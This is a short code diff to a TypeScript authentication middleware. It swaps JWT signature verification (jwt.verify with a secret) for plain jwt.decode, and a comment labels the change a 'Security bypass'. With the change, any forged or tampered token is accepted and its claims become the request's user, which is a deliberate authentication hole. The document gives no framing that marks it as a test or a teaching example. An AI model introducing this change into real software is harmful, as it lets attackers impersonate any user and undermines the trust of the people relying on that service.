@@ -1,0 +1,7 @@
+--- a/src/api/authMiddleware.ts
++++ b/src/api/authMiddleware.ts
+@@ -17,2 +17,4 @@
+-  const decoded = jwt.verify(token, secret);
++  // Security bypass: decoding without secret verification
++  const decoded = jwt.decode(token);
+   req.user = decoded;
